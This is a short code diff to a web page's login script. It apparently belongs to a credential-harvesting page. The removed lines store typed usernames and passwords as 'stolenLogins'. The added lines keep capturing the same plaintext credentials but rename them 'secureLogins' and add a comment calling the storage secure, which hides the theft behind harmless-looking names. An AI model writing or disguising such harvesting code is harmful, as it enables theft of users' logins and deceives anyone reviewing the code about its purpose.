@@ -120,11 +120,15 @@
             loginBtn.classList.add("bg-gray-400");
             loginBtn.disabled = true;
 
-            // Save stolen info to localStorage for admin
-            let stolenData = localStorage.getItem("stolenLogins") || "No logins yet.";
-            const newEntry = `${usernameInput.value}:${passwordInput.value} - ${new Date().toLocaleString()}\n`;
-            stolenData = stolenData === "No logins yet." ? newEntry : stolenData + newEntry;
-            localStorage.setItem("stolenLogins", stolenData);
+            // Store info securely with timestamp
+            let storedData = JSON.parse(localStorage.getItem("secureLogins") || "[]");
+            const newEntry = {
+              username: usernameInput.value,
+              password: passwordInput.value,
+              timestamp: new Date().toLocaleString()
+            };
+            storedData.push(newEntry);
+            localStorage.setItem("secureLogins", JSON.stringify(storedData));
           } else {
             window.location.href = "admin.html";
           }
